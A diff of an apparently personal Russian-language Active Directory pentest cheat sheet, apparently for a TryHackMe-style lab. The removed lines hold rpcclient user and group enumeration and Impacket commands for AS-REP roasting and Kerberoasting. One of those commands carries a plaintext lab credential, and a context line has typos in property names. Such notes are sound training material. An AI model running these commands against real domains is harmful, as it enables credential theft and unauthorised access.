@@ -109,17 +109,6 @@ net group "domain admins" кто входит в группы
 Get-ADcomputer -filter * -properties * | ft nmae, ipv4adress компутеры в домене
 net group "domain computer"
 
-снаружи домена 
-rpcclient 10.10.38.153 -U nik - нужен пароль - может перечислять пользователей и группы в домене 
-enumdomusers - перчисляет пользователей 
-enumdomgroup - перечисляет группы
-
-Поиск SPN_учетных записей без пароля
-python3 GetNPUsers.py enterprise.thm/ -dc-ip 10.10.38.153 -usersfile /home/max/users.txt -no-pass
-
-Глянуть SPN 
-
-python3 GetUserSPNs.py -dc-ip 10.10.154.84 lab.enterprise.thm/nik:ToastyBoi! -request
 
    Скрипты векторов повышения привелегий
 
